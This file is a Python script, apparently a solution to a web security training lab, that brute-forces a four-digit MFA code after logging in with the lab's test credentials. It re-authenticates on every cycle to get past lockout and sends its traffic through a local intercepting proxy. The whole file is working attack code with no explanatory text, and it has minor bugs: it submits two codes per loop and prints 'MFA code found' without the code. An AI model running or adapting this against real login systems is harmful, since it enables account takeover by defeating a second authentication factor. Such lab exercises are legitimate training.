import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#MFA code starts at -1 but first iteration within brute_force() func is 0000    
mfa_code = '%04d' % -1

def brute_force(s, url):
    login_path = "/login2"
    csrf_token = get_csrf_token_login2(s,url)
    #print(csrf_token)
    global mfa_code
    if int(mfa_code) < 10000:
        mfa_code = '%04d' % (int(mfa_code) + 1)
    #print(mfa_code)
    data = {'csrf': csrf_token, 'mfa-code': mfa_code}
    res2 = s.post(url + login_path, data=data, verify=False, proxies=proxies)
    #print(res2.url)
    return res2.url, mfa_code

def get_csrf_token_login2(s, url):
    login_path = "/login2"
    r = s.get(url + login_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf2 = soup.find("input")['value']
    return csrf2

def get_csrf_token_login(s, url):
    login_path = "/login"
    r = s.get(url + login_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf1 = soup.find("input")['value']
    return csrf1

def login(s, url):
    login_path = "/login"
    csrf_token = get_csrf_token_login(s, url)
    #print(csrf_token)
    data = {'csrf': csrf_token, 'username': 'carlos', 'password': 'montoya'}
    res = s.post(url + login_path, data=data, verify=False, proxies=proxies)
    #print(res.url)
    return res.url

def main():
    if len(sys.argv) != 2:
        print("not enough arguments")
    url = sys.argv[1]
    print("Logging in as user: carlos")
    s = requests.Session()
    
    while True:
        login_attempt = login(s, url)
        if '/login2' in str(login_attempt):
            brute_attempt = brute_force(s, url)
            print('testing mfa code: '+ mfa_code)
            brute_attempt = brute_force(s, url)
            print('testing mfa code: '+ mfa_code)
            if '/my-account' in brute_attempt:
                print("MFA code found: " )
                break
            
        else:
            print('Logging in again')
            login_attempt = login(s, url)

if __name__ == "__main__":
    main()
